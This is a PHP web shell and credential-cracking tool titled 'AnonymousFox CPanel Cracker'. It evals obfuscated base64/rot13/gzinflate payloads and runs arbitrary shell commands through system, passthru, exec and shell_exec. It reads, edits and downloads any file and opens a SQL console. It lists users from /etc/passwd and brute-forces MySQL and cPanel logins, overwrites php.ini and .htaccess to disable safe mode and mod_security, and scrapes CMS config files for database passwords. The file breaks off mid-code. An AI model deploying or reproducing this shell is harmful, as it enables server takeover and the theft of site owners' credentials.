<?php
echo'<html>
 <title>AnonymousFox</title>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
@set_time_limit(0);
@error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$ip = $_SERVER['SERVER_ADDR'];
echo '<head>

  <style type="text/css">
body {
background-color:#000000;
background-image:url("https://i.imgur.com/hLcQCBx.gif");
background-repeat:repeat;
margin-top:20px;
font-family:"Agency FB";
font-size:12pt; color:#ffffff;
	}
	input,textarea,select{
	font-weight: bold;
	color: #cccccc;
	dashed #ffffff;
	border: 1px
	solid #2C2C2C;
	background-color: #080808
	}
	a {
		background-color: #151515;
		vertical-align: bottom;
		color: #fff;
		text-decoration: none;
		font-size: 20px;
		margin: 8px;
		padding: 6px;
		border: thin solid #000;
	}
	a:hover {
		background-color: #080808;
		vertical-align: bottom;
		color: #333;
		text-decoration: none;
		font-size: 20px;
		margin: 8px;
		padding: 6px;
		border: #d53b3b;
	}
	.style1 {
		text-align: center;
		color: #1eca33;
	}
	.style11 {
		text-align: center;
		color: #fff;
	}
	.style2 {
		color: #1eca33;
		font-weight: bold;
		
			}
	.style3 {
		color: #1eca33;
			}
	-->
	input[type=submit] {
	color: #000;
    background:#ccc; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px; 
}
	</style>

	</head>
	';
$Getconfig = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
eval(base64_decode($Getconfig));
	function in($type,$name,$size,$value,$checked=0)
	 {
	 $ret = "<input type=".$type." name=".$name." "; if($size != 0)
	 {
	 $ret .= "size=".$size." "; }
	 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }

	class my_sql
	 {
	 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect()
	 {
	 switch($this->db)
	 {
	 case 'MySQL': if(empty($this->port))
	 {
	 $this->port = '3306'; }
	 if(!function_exists('mysqli_connect')) return 0; $this->connection = @mysqli_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(empty($this->port))
	 {
	 $this->port = '1433'; }
	 if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port))
	 {
	 $this->port = '5432'; }
	 $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
	 return 0; }
	 function select_db()
	 {
	 switch($this->db)
	 {
	 case 'MySQL': if(@mysqli_select_db($this->base,$this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
	 return 0; }
	 function query($query)
	 {
	 $this->res=$this->error=''; switch($this->db)
	 {
	 case 'MySQL': if(false===($this->res=@mysqli_query(''.$query,$this->connection)))
	 {
	 $this->error = @mysqli_error($this->connection); return 0; }
	 else if(is_resource($this->res))
	 {
	 return 1; }
	 return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection)))
	 {
	 $this->error = 'Query error'; return 0; }
	 else if(@mssql_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query)))
	 {
	 $this->error = @pg_last_error($this->connection); return 0; }
	 else if(@pg_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query)))
	 {
	 $this->error = 'Query parse error'; }
	 else
	 {
	 if(@ociexecute($this->res))
	 {
	 if(@ocirowcount($this->res) != 0) return 2; return 1; }
	 $error = @ocierror(); $this->error=$error['message']; }
	 break; }
	 return 0; }
	 function get_result()
	 {
	 $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db)
	 {
	 case 'MySQL': $this->num_rows=@mysqli_num_rows($this->res); $this->num_fields=@mysqli_num_fields($this->res); while(false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))); @mysqli_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; }
	 return 0; }
	 function dump($table)
	 {
	 if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '##'; $this->dump[1] = '## --------------------------------------- '; $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '## Database: '.$this->base; $this->dump[4] = '##    Table: '.$table; $this->dump[5] = '## --------------------------------------- '; switch($this->db)
	 {
	 case 'MySQL': $this->dump[0] = '## MySQL dump'; if($this->query(' SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '## --------------------------------------- '; if($this->query(' SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @mysqli_real_escape_string($v);}
	 $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'Oracle': $this->dump[0] = '## ORACLE dump'; $this->dump[] = '## under construction'; break; default: return 0; break; }
	 return 1; }
	 function close()
	 {
	 switch($this->db)
	 {
	 case 'MySQL': @mysqli_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
	 }
	 function affected_rows()
	 {
	 switch($this->db)
	 {
	 case 'MySQL': return @mysqli_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
	 }
	 }
	 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name']))
	 {
	 if(!$file=@fopen($_POST['d_name'],"r"))
	 {
	 err(1,$_POST['d_name']); $_POST['cccc']=""; }
	 else
	 {
	 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding))
	 {
	 header('Content-Encoding: ' . $content_encoding); }
	 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump;  }
	 }
	 if(isset($_GET['phpinfo']))
	 {
	 echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
	 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query")
	 {
	 echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysqli_l']; $sql->pass = $_POST['mysqli_p']; $sql->base = $_POST['mysqli_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 foreach($querys as $num=>$query)
	 {
	 if(strlen($query)>5)
	 {
	 echo "<font face=Verdana size=-2 color=#1eca33><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query))
	 {
	 case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result())
	 {
	 echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++)
	 {
	 foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
	 echo "</table>"; }
	 break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
	 }
	 }
	 }
	 }
	 echo "<br><title>Cracker By AnonymousFox</title><form name=form method=POST>";
	 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysqli_l',0,$_POST['mysqli_l']); echo in('hidden','mysqli_p',0,$_POST['mysqli_p']); echo in('hidden','mysqli_db',0,$_POST['mysqli_db']); echo in('hidden','cccc',0,'db_query');
	 echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysqli_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
	function ccmmdd($ccmmdd2,$att)
	{
	global $ccmmdd2,$att;
	echo '
	<table style="width: 100%" class="style1" dir="rtl">
		<tr>
			<td class="style9"><strong>???H?/strong></td>
		</tr>
		<tr>
			<td class="style13">
					<form method="post">
						<select name="att" dir="rtl" style="height: 109px" size="6">
	';
	if($_POST['att']==null)
	{
	echo '						<option value="system" selected="">system</option>';
	}else{
	echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
							<option value=system>system</option>
	";
	}
	echo '
							<option value="passthru">passthru</option>
							<option value="exec">exec</option>
							<option value="shell_exec">shell_exec</option>
						</select>
							<input name="page" value="ccmmdd" type="hidden"><br>
							<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
							<input type="submit" value="??
					</form>

			</td>
		</tr>
		<tr>
			<td class="style13">
	';
			if($_POST[att]=='system')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						system($_POST['ccmmdd2']);
	echo '					</textarea>';
			}

			if($_POST[att]=='passthru')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						passthru($_POST['ccmmdd2']);
	echo '					</textarea>';
			}
			if($_POST[att]=='exec')
			{
	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						exec($_POST['ccmmdd2'],$res);
					echo $res = join("\n",$res);
	echo '					</textarea>';
			}
			if($_POST[att]=='shell_exec')
			{
	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					echo	shell_exec($_POST['ccmmdd2']);
	echo '					</textarea>';
			}
	echo '
			</td>
		</tr>
	</table>
	';
	exit;
	}
	if($_POST['page']=='edit')
	{
	$code=@str_replace("\r\n","\n",$_POST['code']);
	$code=@str_replace('\\','',$code);
	$fp = fopen($pathclass, 'w');
	fwrite($fp,"$code");
	fclose($fp);
	echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
	exit;
	}
		if($_POST['page']=='show')
		{
		$pathclass =$_POST['pathclass'];
	echo '
	<form method="POST">
	<input type="hidden" name="page" value="edit">
	';

		$sahacker = fopen($pathclass, "rb");
	echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';
	$code = fread($sahacker, filesize($pathclass));
	echo $code =htmlspecialchars($code);
	echo '</textarea>';
		fclose($sahacker);
	echo '
	<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
	<br><strong><input type="submit" value="edit file">
	</form>
	';
			exit;
		}
		if($_POST['page']=='ccmmdd')
		{
		echo ccmmdd($ccmmdd2,$att);
		exit;
		}
	if($_POST['page']=='find')
	{
	if(isset($_POST['usernames']) && isset($_POST['passwords']))
	{
			if($_POST['type'] == 'passwd'){
					$e = explode("\n",$_POST['usernames']);
					foreach($e as $value){
					$k = explode(":",$value);
					$username .= $k['0']." ";
					}
			}elseif($_POST['type'] == 'simple'){
					$username = str_replace("\n",' ',$_POST['usernames']);
			}
			$a1 = explode(" ",$username);
			$a2 = explode("\n",$_POST['passwords']);
			$id2 = count($a2);
			$ok = 0;
			foreach($a1 as $user )
			{
					if($user !== '')
					{
					$user=trim($user);
					 for($i=0;$i<=$id2;$i++)
					 {
							$pass = trim($a2[$i]);
							if(@mysqli_connect('localhost',$user,$pass))
							{
									echo "<center> Host : http://$ip:2082 User : <b><font color=#1eca33>$user</font></b> Password : <b><font color=red>$pass</font></b><br /></center>";
									$ok++;
							}
					 }
					}
			}
			echo "<center><hr><b>You Found <font color=#1eca33>$ok</font> cPanel (Cracker)</b><br><br></center>";
			echo "<center><b><a href=".$_SERVER['PHP_SELF'].">< BACK</a>";
			exit;
	}
	}

echo '<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

<center><br>
<font color=white size="40">CPANEL CRACKER</font><font color=#1eca33 size="3"> v2</font></center>

<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1">
<font
color="red" face="comic sans ms"size="1"><b>
<font color=#1eca33>

</font><br><font color=white>--==[[Greetz to]]==--</font><br><font  color=#1eca33>-=| AnonymousFox |=-<br>

</table>
</table> <div align=center><font color=#1eca33 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="5" width="70%"><br>

<span  class="footerlink"> ####### Coded By AnonymousFox #######</span>

</marquee><br><br></font></div><div align=center><table width=50%>
 <tr>
   
   <a href=""  class="style2"><strong>CPanelCracker Script</strong></a></center></td>
   </tr>';
   echo '<p>
   
   <td valign="top" bgcolor="#151515" colspan="5">
<strong>';
echo "<right>";
echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
 <p align='center'>
 <INPUT type='submit' name='Kill' value='if Not Working Cilck Here To Kill The SafeMode [ini.php] [php.ini] [.htaccess]' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-width: 1px'></p>
</form>
";
echo "<right/>";
if  (empty($_POST['Kill'] ) ) {
 }ELSE{
 $action = '?action=Kill';
echo "<html>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<center><b>[SafeMode Done]</center>";
echo ("");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
KillFilterEngine Off
KillFilterScanPOST Off
KillFilterCheckURLEncoding Off
KillFilterCheckUnicodeEncoding Off
</IfModule>
");
echo "<center><b>[Mod_Security Done]</center>";

    echo "<font><center></td></tr><table> ";
 }
echo '</strong>
</tr>
</td>';
echo '
 <form method="POST" target="_blank">
  <strong>
   <input name="page" type="hidden" value="find">
   </strong>
   <table width="600" border="0" cellpadding="10" cellspacing="1" align="center">
   <tr>
   <td>
   <table width="100%" border="0" cellpadding="10" cellspacing="1" align="center">
   <td valign="top" bgcolor="#151515" class="style2" ">
  <strong>User :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="100" rows="10" name="usernames">'; 
   
$users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
} echo '</textarea></strong></td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" class="style2" ">
  <strong>Pass :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="100" rows="10" name="passwords"></textarea></strong></td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" class="style2" ">
  <strong>Type :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
   <span class="style11"><strong>Simple : </strong> </span>
  <strong>
  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
   <font class="style11"><strong>/etc/passwd : </strong> </font>
  <strong>
  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
  </span>
   </td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" "></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Start">
   </td>
   </tr>
 </form>
  <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Config Zone</strong></td>
       </tr>
	   
    <tr>
   <td valign="top" bgcolor="#151515" class="style2" "><strong>Config tools:</strong></td>
   <td valign="top" class="style2" bgcolor="#151515" colspan="5">
  <strong>';
$configer = "7Vx7RttVEv97qeI7zLq4MgkPETZKucpvNsDZa7NqxmQCtxCyLo1BI258cHZ5dpG2+O7XMyPJ8gsZbarurupcBbE1079+Wb+kuPkQ22SfCWK7HsbMVviwL1yXuqy+WA5e/bi5EY/J9kn/7LRo/or8sblO4DW99LUeQ3scQurfVaNO6nmY3lKUbKxe7JWvD+lQGLvbtW+5Btjv3r2T8PkeZC+2eIla9hixVbHRZSn1d+V9W5HHg0AwUxqkaeprMbUZubJQoHTkM1oSOnUN0+vYfmCbG59vSgQeaId3A4nE/X7kpZsbnTA8HzqCa+Les0Dn2Cb7QeQQtWXJ7TAR7vzi5lOLezEbD1bHHtZXEn0Yx4noO77XB1trwvZLVkZ4P5cXZy5xn0RVa07f4YwNT0MpN6u+Q/+2ZaO4ahIags02NyTyZ62MPaau4E4Ep0ii5Yx5clvLh6RLOHwW/L3EXsRIe30GU3d1mq9//ja//LtVVEeCOa6Y9F0BlgzEad26te64e3gNBgNrp3lneEzgeWj4RJjzjKS3KYyUe04ECJly44JgTo85h6qR/VncfUWzIs9mTxoweODsdu9IdD89MrU9Ex8I9j5FNwQBGNv37nSdZH1empHvZemwFfz+TnaaYzQz64Ha4oHFFdyu6QNaUhhwGIKf+am1ljFu9eICwYrFnmBJKMbcQjwL8pYX2xNJwfST6zs8wVu0YBfbTgXLM2MYj7ci6iDYZcexIGWthAYg/n2aPMHwhkIg90MMtzCN7fVB8dQRaZe7HkG3JA5HPOTmDbnHVJyJCua9JIlMwlRYmT9BP3NiH6uLSQLlb3LJ0puXlKwPGeVpzYLV6db/4aKVKfBx0aqy59uDtyt6CXh4GRL2/bdNZGZQIeb8aroRaiEvNNrnn/f+T2k+ZjvQPCFEkJ2riQ01uAtBDVg0CYXLPscu88jOL5fnN9dxVP4+56ME1lu+o8pZ00JAoeLjJ8ECN0nsyM4JQsXHOPSixutZEM2BvJbRAHPb3HWKgQtWsnRCb1uQRru40qVpVf70VLP312mvaN7/fGjdO+nc9B7JYvuvtc3J15Put2+/lIPcV9ytEky7bPWotl7vNhs/HBzuA8kaniVCFOVJE5ePc/0qZiu9WC4vZK2tmMX9yAvKLsOTUer4Qh9chJxAkVwZJVuaZVkh3ZUZzXVFG8xr6UvZYVuS7hbs55Tcqur3pv1BH6SFnnR7//VCr97fv5edRVOdaD99LUnObtrylRa/vvmm2j5oCU9uxoxbRaN5I1XEXZcPIRIj6AqsgsLa1/pTnFI10jgmtY+XN3uleLtxgcTxVJDhTv00TNKSdZSi+6gCmGIxNLnqJqpVSrcMGlFqB3h3MN8CdYh2ta+CTCjpGiCr3pXUZiVNE+fVaw3eQpVcDZZK1yqwu5EFJlX8Q7AFgX4e+VYiwEFIIGsE7ReGY5gBoCAwcJcF4ptutavPZPbd0sGesi5aRuEGojJgwI8NTtEFk74YKKAL5/xPLMeloR9rplELIPQMTuXn3p8kZwT5oYC4Oqs8+5nb2SxU52qu1bQW5FUPhTFX6AQHIDyOAmOo62ScIXGtwE0SUP7xDFJhiwHDiZ9iUaGgfSkUKVIBqCUMwN0bHPkhzpPRVACegI5znAQLj7w0vX66tUkyTiGsIP4N+tZhq5I4XfLI7kzyy1yGT8iSGQpQcjMUT8qLfvOFCHcJhaCSAQpO5SMUAqQDHP0hjv5qtQuHIUYCCkCFziqIteJ3EKUBW3bKtSA+Vwi8EP9uBLkJega0DksVsBpgFUDRX562zmQAZ2hJTAsgwgK02nR0p83zHi4o5YNTKDYC59HMCFdVcsUxgYE+2the2YGs7V9KJ1/QHoKVo9t24vxcPk1PAQRLgNPmp14Th+CGwlIhQzRP9/qqaoI8iiQWNvIw8BBNkUGz1zGgDGrFyr7mGQqhbrJcdyKTmsijKIyLq+t4eeq5iJMEm21TBjAu2n/D0ftQnA5V+pvOVudYDwfBej5MbBO1FlGKh9BEYiJZZ+CbCBaNcSJxAnBV3cte99fTNtJRkQgeqI/UyQRVllhjLXOWWWN93cgEyFKn9XgPajYXnD0InERUa4hJr9th4vJXWAS+i1gKDA/R6lxwYmBrgr1sTiPIME6HCDo8QwB07XP3stPC+dSZ7wYRdDiXY1mAZ7rd0zay3+4EAfWR3TI3gNFhIe9/2gxs8+JwAbL2wVG5N0To/18TWP0lrsO+wTXIKY48q0DYp4FGGOSTXYfbApeHtYci60QGb+RJFP/ocDRN+H/EC22fUkAlMb3PYiSxODgA9bwWhWOJU5g+czUBg7cH+kfUw04UgmlCnBD6oZgBDOS55G54AgQpipmYy+sTCgVXBM7baGU3EjEGvK34rksYM2Ivz6ulL4z9XdjBGt/n/Jfecwxi8XtkVUCj0s1+KxEJSeDEjL49fPNhCiBGtPTaNb5vlHo0BXMC59IQzrTMmAMzcieZlAxAzTrny2RnTzAhkC5PxpCMnF1ekMxOGRErL0HmoIyIBYXKUbzoZXIw8tb30eXjw+URETlVkr0F0i2bpzxbTZjDfcYwQjGNwkYQcTqOoqaJJqI0WpQxXzZoqPjNAgCz5YweiVWYS7aixEN8p0UsWQAV9t4rW0CNJO7OjwSVX3DHlzqU4Gp0aF5T+Dh76WRaKy+decxfxdDdSS5TrUgMABYzm0VQNWeprpQ0lRerBjCfFGFuWbAwfTaL1iCLEnODcQjxCpk01EUJlGxzhhafwWT5iOOMgibmGC8Fh5CW44DqGjB+d1exNIY4O6A4M5NLGi4kpanD/EU+kChUFs8gM6SjUcwNIdZJqPzEQ+CzLFv95xQqXPxSWTMDL/Wl1aG55vjxbyoUTlFW7SiQxdI9PuIkZcW4ZFvOPre146MxS5IENKFhI4lGZPyJ2uLIkkqPjywOPxlA7aVmu7NleWFZJSla6FdEmvCvcQlbU3KBs3qwo1t+acReJN7ScfakiEwuW1DKeacxTtXg+jMkSPt0BCUt4d4JaoW8bf/a4s6WulkSKO4pVoUX0RBAHQC8rREeVSD4LB2skPW7746gJ1YgDx0rRORrtPy+DYFrEZJLzaMCbJDAu1NdrtWJWAfw/vCgLp0U3r05OKgDSy6XEiPrVchpWg1Sd6AizjJWrZyf5j6SIuVzPdJlcpzBOOojiJKJpkIGPhPmDRNsciCz2Xtla2Pg3P8IC5GIJ5EHC2IOQHalLNXD1mo88SUF+GNudwIfjiy9oSzGHIkM0inNF/i0BkTm4UDX0u+Ipi+RLgpK/JkEIPtMvSElriPpTxloYbyj2IZRWbyho+j9RBpYg+WALTC19/330gEsL5S/3HAi84qbQZ1YH+Mj+en43w==";
eval(str_rot13(gzinflate(str_rot13(base64_decode(($configer)))))); 
//here he get configs i decode it in other file co.txt
echo '</strong>
</td></form>
    </tr>
<tr>
   <td valign="top" bgcolor="#151515" class="style2" "><strong>Grab Passwords:</strong></td>
   <td valign="top" class="style2" bgcolor="#151515" colspan="5">
  <strong>
  <center>';
 function GrabUrl($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
}
function AnonymousFox($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
echo "<center>
<form method='post'>
<input type='text' name='linkconf' height='10' size='50' placeholder='http://url.com/sym404/'>
<input type='submit' style='width: 70px;' name='gass' value='Submit!!'>
</form>";
if($_POST['gass']) {
	echo "
<form method='post'>
Links of Configs: <br>

<textarea rows='20' cols='100' name='link'>";
GrabUrl($_POST['linkconf'],'');	
echo"</textarea><br><br>
<input type='submit' style='width: 130px;' name='edittitle' value='Get Passwords :D'>
</form>";
}
if($_POST['edittitle']) {
	        $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
	preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$config,$m1);         	  // wordpress
	preg_match('#password = \'(.*)\'#',$config,$m2);              	  // joomla
	preg_match('#password\'] = \'(.*)\'#',$config,$m3);         		  // vb
	preg_match('#db_password = "(.*)"#',$config,$m4);          		  // whmcs
	preg_match('#db_password = \'(.*)\'#',$config,$m4);        		  // whmcs
	preg_match('#dbpass = "(.*)"#',$config,$m5);              		  //
